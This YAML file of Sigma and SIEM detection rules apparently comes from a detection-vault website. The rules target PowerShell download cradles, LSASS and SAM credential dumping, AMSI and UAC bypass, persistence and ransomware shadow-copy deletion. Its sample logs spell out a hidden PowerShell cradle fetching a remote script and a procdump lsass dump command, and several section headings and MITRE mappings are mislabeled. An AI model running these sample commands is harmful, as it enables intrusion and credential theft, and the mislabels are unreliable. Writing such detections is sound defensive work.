rules:
  # ══════════════════════════════════════════════════════════
  # SHOWCASE — these 2 rules display full SIEM tabs on the site
  # ══════════════════════════════════════════════════════════
  - name: "Suspicious PowerShell Download Cradle"
    description: "Detects PowerShell download cradles used in malware delivery — Invoke-WebRequest, Net.WebClient, and BitsTransfer patterns."
    category: "Execution"
    platform: "Sigma"
    mitre: "T1059.001"
    mitre_name: "Command and Scripting Interpreter: PowerShell"
    severity: "high"
    showcase: true
    query: |
      title: Suspicious PowerShell Download Cradle
      id: scw-showcase-exec-001
      status: stable
      level: high
      description: |
        Detects PowerShell download cradles used in malware delivery — Invoke-WebRequest, Net.WebClient, and BitsTransfer patterns.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.execution
        - attack.t1059.001
        - attack.t1105
      logsource:
        category: process_creation
      detection:
        selection:
          Image|endswith: '\powershell.exe'
          CommandLine|contains:
            - 'Invoke-WebRequest'
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Start-BitsTransfer'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    siem_splunk: |
      index=windows sourcetype=sysmon EventCode=1
        Image="*\\powershell.exe"
        (CommandLine="*Invoke-WebRequest*"
         OR CommandLine="*Net.WebClient*"
         OR CommandLine="*DownloadString*"
         OR CommandLine="*DownloadFile*"
         OR CommandLine="*Start-BitsTransfer*")
      | table _time host user Image CommandLine
    siem_kql: |
      DeviceProcessEvents
      | where FileName =~ "powershell.exe"
      | where ProcessCommandLine has_any (
          "Invoke-WebRequest", "Net.WebClient",
          "DownloadString", "DownloadFile",
          "Start-BitsTransfer")
      | project Timestamp, DeviceName, AccountName,
          ProcessCommandLine
    siem_elastic: |
      process.executable:*\\powershell.exe AND
      process.command_line:(
        *Invoke-WebRequest* OR *Net.WebClient* OR
        *DownloadString* OR *DownloadFile* OR
        *Start-BitsTransfer*)
    siem_qradar: |
      SELECT DATEFORMAT(starttime,'yyyy-MM-dd HH:mm') AS date,
        sourceip, "Image", "CommandLine"
      FROM events
      WHERE "Image" ILIKE '%\powershell.exe'
        AND ("CommandLine" ILIKE '%Invoke-WebRequest%'
         OR "CommandLine" ILIKE '%Net.WebClient%'
         OR "CommandLine" ILIKE '%DownloadString%'
         OR "CommandLine" ILIKE '%DownloadFile%'
         OR "CommandLine" ILIKE '%Start-BitsTransfer%')
    siem_wazuh: |
      <rule id="100200" level="12">
        <if_group>sysmon_event1</if_group>
        <field name="win.eventdata.image" type="pcre2">
          (?i)\\powershell\.exe$</field>
        <field name="win.eventdata.commandLine" type="pcre2">
          (?i)(Invoke-WebRequest|Net\.WebClient|DownloadString|DownloadFile|Start-BitsTransfer)</field>
        <description>Suspicious PowerShell Download Cradle</description>
        <mitre>
          <id>T1059.001</id>
          <id>T1105</id>
        </mitre>
        <group>sysmon,process_creation,</group>
      </rule>
    tags: [powershell, download-cradle, malware-delivery, execution]
    sample_log: |
      {
        "timestamp": "2026-04-17T14:32:08Z",
        "EventCode": 1,
        "host": "WKS-PC042",
        "User": "CORP\\j.smith",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')\""
      }
    sample_matches:
      - field: "Image"
        op: "endswith"
        value: "\\powershell.exe"
      - field: "CommandLine"
        op: "contains"
        value: "Net.WebClient"
      - field: "CommandLine"
        op: "contains"
        value: "DownloadString"

  - name: "LSASS Memory Access — Credential Dumping"
    description: "Detects suspicious access to LSASS process memory — primary technique for credential harvesting on Windows endpoints."
    category: "Credential Access"
    platform: "Sigma"
    mitre: "T1003.001"
    mitre_name: "OS Credential Dumping: LSASS Memory"
    severity: "critical"
    showcase: true
    query: |
      title: LSASS Memory Access — Credential Dumping
      id: scw-showcase-cred-001
      status: stable
      level: critical
      description: |
        Detects suspicious access to LSASS process memory — primary technique for credential harvesting on Windows endpoints.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.credential_access
        - attack.t1003.001
      logsource:
        category: process_creation
      detection:
        selection:
          CommandLine|contains:
            - 'lsass'
            - 'procdump'
            - 'minidump'
            - 'sekurlsa'
            - 'comsvcs'
        filter:
          Image|endswith:
            - '\wmiprvse.exe'
            - '\taskmgr.exe'
            - '\MsMpEng.exe'
        condition: selection and not filter
      falsepositives:
        - Legitimate administrative activity
    siem_splunk: |
      index=windows sourcetype=sysmon EventCode=10
        TargetImage="*\\lsass.exe"
        (GrantedAccess="0x1010" OR GrantedAccess="0x1038"
         OR GrantedAccess="0x1fffff")
        NOT (SourceImage="*\\wmiprvse.exe"
         OR SourceImage="*\\taskmgr.exe"
         OR SourceImage="*\\MsMpEng.exe")
      | table _time host user SourceImage GrantedAccess
    siem_kql: |
      DeviceEvents
      | where ActionType == "OpenProcessApiCall"
      | where FileName =~ "lsass.exe"
      | where InitiatingProcessFileName !in~
          ("wmiprvse.exe","taskmgr.exe","MsMpEng.exe")
      | project Timestamp, DeviceName,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
    siem_elastic: |
      winlog.event_data.TargetImage:*\\lsass.exe AND
      winlog.event_data.GrantedAccess:(
        "0x1010" OR "0x1038" OR "0x1fffff")
      AND NOT process.executable:(
        *\\wmiprvse.exe OR *\\taskmgr.exe
        OR *\\MsMpEng.exe)
    siem_qradar: |
      SELECT DATEFORMAT(starttime,'yyyy-MM-dd HH:mm') AS date,
        sourceip, "SourceImage", "TargetImage", "GrantedAccess"
      FROM events
      WHERE "TargetImage" ILIKE '%\lsass.exe'
        AND "GrantedAccess" IN ('0x1010','0x1038','0x1fffff')
        AND "SourceImage" NOT ILIKE '%\wmiprvse.exe'
        AND "SourceImage" NOT ILIKE '%\taskmgr.exe'
        AND "SourceImage" NOT ILIKE '%\MsMpEng.exe'
    siem_wazuh: |
      <rule id="100201" level="14">
        <if_group>sysmon_event10</if_group>
        <field name="win.eventdata.targetImage" type="pcre2">
          (?i)\\lsass\.exe$</field>
        <field name="win.eventdata.grantedAccess" type="pcre2">
          (0x1010|0x1038|0x1fffff)</field>
        <description>LSASS Memory Access — Credential Dumping</description>
        <mitre>
          <id>T1003.001</id>
        </mitre>
        <group>sysmon,credential_access,</group>
      </rule>
    tags: [lsass, credential-dumping, mimikatz, procdump]
    sample_log: |
      {
        "timestamp": "2026-04-17T03:14:55Z",
        "EventCode": 10,
        "host": "DC-PRIMARY",
        "User": "NT AUTHORITY\\SYSTEM",
        "SourceImage": "C:\\Users\\admin\\Desktop\\procdump64.exe",
        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
        "GrantedAccess": "0x1fffff",
        "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\debug.dmp"
      }
    sample_matches:
      - field: "CommandLine"
        op: "contains"
        value: "lsass"
      - field: "CommandLine"
        op: "contains"
        value: "procdump"
      - field: "Image"
        op: "not endswith"
        value: "\\wmiprvse.exe (filter passed)"

  # ══════════════════════════════════════════════════════════
  # BRUTE FORCE
  # ══════════════════════════════════════════════════════════
  - name: "Credential Dumping – SAM Registry Hive Export"
    description: "Detects attempts to export the SAM, SYSTEM, or SECURITY registry hives — used to extract local account password hashes."
    category: "Credential Access"
    platform: "Sigma"
    mitre: "T1003.002"
    mitre_name: "OS Credential Dumping: Security Account Manager"
    severity: "high"
    query: |
      title: SAM Registry Hive Export
      id: scw-vault-cred-001
      status: stable
      level: high
      description: |
        Detects attempts to export the SAM, SYSTEM, or SECURITY registry hives — used to extract local account password hashes.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.credential_access
        - attack.t1003.002
      logsource:
        category: process_creation
      detection:
        selection:
          CommandLine|contains|all:
            - 'reg'
            - 'save'
          CommandLine|contains:
            - 'hklm\sam'
            - 'hklm\system'
            - 'hklm\security'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    tags: [credential-dumping, registry, SAM]
    notes: "Near-zero false positive. No legitimate reason and export SAM/SECURITY hives in production."

  - name: "AMSI Bypass Detected"
    description: "Detects attempts to bypass the Antimalware Scan Interface (AMSI) — used to run malicious PowerShell and .NET without detection."
    category: "Defense Evasion"
    platform: "Sigma"
    mitre: "T1562.001"
    mitre_name: "Impair Defenses: Disable or Modify Tools"
    severity: "high"
    query: |
      title: AMSI Bypass Attempt
      id: scw-vault-evasion-001
      status: experimental
      level: high
      description: |
        Detects attempts to bypass the Antimalware Scan Interface (AMSI) — used to run malicious PowerShell and .NET without detection.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.defense_evasion
        - attack.t1562.001
      logsource:
        category: process_creation
      detection:
        selection:
          CommandLine|contains:
            - 'AmsiUtils'
            - 'amsiInitFailed'
            - 'AmsiScanBuffer'
            - 'SetProtection(0'
            - 'Bypass.AMSI'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    tags: [amsi-bypass, evasion, powershell]
    notes: "AMSI bypass is almost always an attack precursor. Check what ran after the bypass."

  - name: "Lateral Movement – SMB Admin Share Access"
    description: "Detects access to admin shares (C$, ADMIN$) from non-standard hosts — common for file deployment and remote execution."
    category: "Lateral Movement"
    platform: "Sigma"
    mitre: "T1021.002"
    mitre_name: "Remote Services: SMB/Windows Admin Shares"
    severity: "medium"
    query: |
      title: Admin Share Access from Non-Server
      id: scw-vault-lateral-001
      status: stable
      level: medium
      description: |
        Detects access to admin shares (C$, ADMIN$) from non-standard hosts — common for file deployment and remote execution.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.lateral_movement
        - attack.t1021.002
      logsource:
        category: authentication
      detection:
        selection:
          EventType: 'share_access'
          CommandLine|contains:
            - '\C$'
            - '\ADMIN$'
        filter:
          src_ip|startswith:
            - '127.'
        condition: selection and not filter
      falsepositives:
        - Legitimate administrative activity
    tags: [admin-share, smb, lateral-movement]
    notes: "Baseline admin share access from IT management tools. Any access from workstations is suspicious."

  # ══════════════════════════════════════════════════════════
  # PERSISTENCE
  # ══════════════════════════════════════════════════════════

  # ══════════════════════════════════════════════════════════
  # PERSISTENCE
  # ══════════════════════════════════════════════════════════
  - name: "New Service Created via sc.exe"
    description: "Detects service creation using sc.exe — a common persistence mechanism used by attackers and malware."
    category: "Persistence"
    platform: "Sigma"
    mitre: "T1543.003"
    mitre_name: "Create or Modify System Process: Windows Service"
    severity: "medium"
    query: |
      title: New Service Created via sc.exe
      id: scw-vault-persist-001
      status: experimental
      level: medium
      description: |
        Detects service creation using sc.exe — a common persistence mechanism used by attackers and malware.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.persistence
        - attack.t1543.003
      logsource:
        category: process_creation
      detection:
        selection:
          Image|endswith: '\sc.exe'
          CommandLine|contains: 'create'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    tags: [persistence, service, sigma]
    notes: "Filter out known deployment tools (SCCM, Intune) to reduce false positives."

  - name: "Persistence – Scheduled Task via schtasks"
    description: "Detects creation of scheduled tasks via command line — common persistence technique across all threat actors."
    category: "Persistence"
    platform: "Sigma"
    mitre: "T1053.005"
    mitre_name: "Scheduled Task/Job: Scheduled Task"
    severity: "medium"
    query: |
      title: Scheduled Task Creation via schtasks.exe
      id: scw-vault-persist-002
      status: stable
      level: medium
      description: |
        Detects creation of scheduled tasks via command line — common persistence technique across all threat actors.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.persistence
        - attack.t1053.005
      logsource:
        category: process_creation
      detection:
        selection:
          Image|endswith: '\schtasks.exe'
          CommandLine|contains|all:
            - '/create'
        filter:
          User|contains:
            - 'SYSTEM'
        condition: selection and not filter
      falsepositives:
        - Legitimate administrative activity
    tags: [persistence, scheduled-task, sigma]
    notes: "Filter SYSTEM-created tasks to reduce noise. Focus on tasks created by regular user accounts."

  - name: "Persistence – Startup Folder Modification"
    description: "Detects files dropped in user or common Startup folders — simple but effective persistence."
    category: "Persistence"
    platform: "Sigma"
    mitre: "T1547.001"
    mitre_name: "Boot or Logon Autostart Execution: Registry Run Keys"
    severity: "medium"
    query: |
      title: File Dropped in Startup Folder
      id: scw-vault-persist-003
      status: stable
      level: medium
      description: |
        Detects files dropped in user or common Startup folders — simple but effective persistence mechanism.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.persistence
        - attack.t1547.001
      logsource:
        category: file_event
      detection:
        selection:
          TargetFilename|contains:
            - '\Start Menu\Programs\Startup\'
            - '\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\'
        filter:
          Image|endswith:
            - '\explorer.exe'
        condition: selection and not filter
      falsepositives:
        - Legitimate administrative activity
    tags: [persistence, startup, file-drop]
    notes: "Users rarely manually add files to Startup. Processes dropping files there are suspicious."

  # ══════════════════════════════════════════════════════════
  # PRIVILEGE ESCALATION
  # ══════════════════════════════════════════════════════════

  # ══════════════════════════════════════════════════════════
  # PRIVILEGE ESCALATION
  # ══════════════════════════════════════════════════════════
  - name: "Privilege Escalation – Token Manipulation"
    description: "Detects access token impersonation techniques commonly used to escalate from user to SYSTEM."
    category: "Privilege Escalation"
    platform: "Sigma"
    mitre: "T1134.001"
    mitre_name: "Access Token Manipulation: Token Impersonation"
    severity: "high"
    query: |
      title: Token Impersonation via Known Tools
      id: scw-vault-privesc-001
      status: experimental
      level: high
      description: |
        Detects access token impersonation techniques commonly used to escalate from user to SYSTEM.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.privilege_escalation
        - attack.t1134.001
      logsource:
        category: process_creation
      detection:
        selection:
          Image|endswith:
            - '\incognito.exe'
            - '\JuicyPotato.exe'
            - '\PrintSpoofer.exe'
            - '\GodPotato.exe'
            - '\RoguePotato.exe'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    tags: [privilege-escalation, token, potato]
    notes: "Near-zero false positive rate. Detection of these tools almost always indicates compromise."

  - name: "Privilege Escalation – UAC Bypass"
    description: "Detects known UAC bypass techniques using fodhelper, eventvwr, or other auto-elevate binaries."
    category: "Privilege Escalation"
    platform: "Sigma"
    mitre: "T1548.002"
    mitre_name: "Abuse Elevation Control Mechanism: Bypass UAC"
    severity: "high"
    query: |
      title: UAC Bypass via Auto-Elevate Binary
      id: scw-vault-privesc-002
      status: experimental
      level: high
      description: |
        Detects known UAC bypass techniques using fodhelper, eventvwr, or other auto-elevate binaries.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.privilege_escalation
        - attack.t1548.002
      logsource:
        category: process_creation
      detection:
        selection_fodhelper:
          ParentImage|endswith: '\fodhelper.exe'
        selection_eventvwr:
          ParentImage|endswith: '\eventvwr.exe'
          Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
        selection_computerdefaults:
          ParentImage|endswith: '\computerdefaults.exe'
          Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
        condition: selection_fodhelper or selection_eventvwr
            or selection_computerdefaults
      falsepositives:
        - Legitimate administrative activity
    tags: [uac-bypass, privilege-escalation, evasion]
    notes: "These binaries should not spawn command interpreters. Any child process is suspicious."

  # ══════════════════════════════════════════════════════════
  # DATA EXFILTRATION
  # ══════════════════════════════════════════════════════════
  - name: "Ransomware – Shadow Copy Deletion"
    description: "Detects deletion of Volume Shadow Copies — almost always a ransomware precursor to prevent recovery."
    category: "Ransomware"
    platform: "Sigma"
    mitre: "T1490"
    mitre_name: "Inhibit System Recovery"
    severity: "critical"
    query: |
      title: Shadow Copy Deletion
      id: scw-vault-impact-001
      status: stable
      level: critical
      description: |
        Detects deletion of Volume Shadow Copies — almost always a ransomware precursor to prevent recovery.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.impact
        - attack.t1490
      logsource:
        category: process_creation
      detection:
        selection_vssadmin:
          CommandLine|contains|all:
            - 'vssadmin'
            - 'delete'
            - 'shadows'
        selection_wmic:
          CommandLine|contains|all:
            - 'wmic'
            - 'shadowcopy'
            - 'delete'
        selection_bcdedit:
          CommandLine|contains|all:
            - 'bcdedit'
            - 'recoveryenabled'
            - 'no'
        condition: selection_vssadmin or selection_wmic
            or selection_bcdedit
      falsepositives:
        - Legitimate administrative activity
    tags: [ransomware, shadow-copy, recovery-prevention]
    notes: "Immediate P1 escalation. Shadow copy deletion + file encryption = active ransomware. Isolate host NOW."

  # ══════════════════════════════════════════════════════════
  # PHISHING
  # ══════════════════════════════════════════════════════════
  - name: "C2 – Cobalt Strike Default Pipe Names"
    description: "Detects named pipes commonly used by Cobalt Strike beacons for inter-process communication."
    category: "Command and Control"
    platform: "Sigma"
    mitre: "T1570"
    mitre_name: "Lateral Tool Transfer"
    severity: "critical"
    query: |
      title: Cobalt Strike Named Pipe Detection
      id: scw-vault-c2-001
      status: stable
      level: critical
      description: |
        Detects named pipes commonly used by Cobalt Strike beacons for inter-process communication.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.command_and_control
        - attack.t1570
      logsource:
        category: process_creation
      detection:
        selection:
          CommandLine|contains:
            - '\MSSE-'
            - '\postex_'
            - '\postex_ssh_'
            - '\status_'
            - '\msagent_'
            - '\interprocess_'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    tags: [cobalt-strike, c2, named-pipe]
    notes: "Default Cobalt Strike pipe names. Sophisticated actors may rename them. Also check for malleable C2 profiles."

  - name: "Discovery – AD Domain Enumeration via net.exe"
    description: "Detects use of native Windows net commands to enumerate domain users, groups, and shares."
    category: "Discovery"
    platform: "Sigma"
    mitre: "T1087.002"
    mitre_name: "Account Discovery: Domain Account"
    severity: "medium"
    query: |
      title: AD Enumeration via net.exe
      id: scw-vault-discovery-001
      status: stable
      level: medium
      description: |
        Detects use of native Windows net commands to enumerate domain users, groups, and shares.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.discovery
        - attack.t1087.002
      logsource:
        category: process_creation
      detection:
        selection:
          Image|endswith:
            - '\net.exe'
            - '\net1.exe'
          CommandLine|contains:
            - 'domain admins'
            - 'enterprise admins'
            - 'domain controllers'
            - 'group "Domain'
            - 'user /domain'
            - 'accounts /domain'
        condition: selection
      falsepositives:
        - Legitimate administrative activity
    tags: [net-commands, ad-enumeration, discovery]
    notes: "Multiple net commands in sequence is a stronger indicator. Check if the user is IT staff."

  # ══════════════════════════════════════════════════════════
  # EXECUTION
  # ══════════════════════════════════════════════════════════
  - name: "Execution – Certutil Download"
    description: "Detects certutil.exe used to download files — a well-known living-off-the-land binary abuse technique."
    category: "Execution"
    platform: "Sigma"
    mitre: "T1105"
    mitre_name: "Ingress Tool Transfer"
    severity: "high"
    query: |
      title: Certutil Download or Decode
      id: scw-vault-exec-001
      status: stable
      level: high
      description: |
        Detects certutil.exe used to download files or decode payloads — a well-known living-off-the-land binary abuse technique.
      author: SCW Detection Vault
      date: 2025-01-15
      references:
        - https://shimiscyberworld.com/detections/
      tags:
        - attack.execution
        - attack.t1105
      logsource:
        category: process_creation
      detection:
        selection_download:
          Image|endswith: '\certutil.exe'
          CommandLine|contains:
            - 'urlcache'
            - '-urlcache'
        selection_decode:
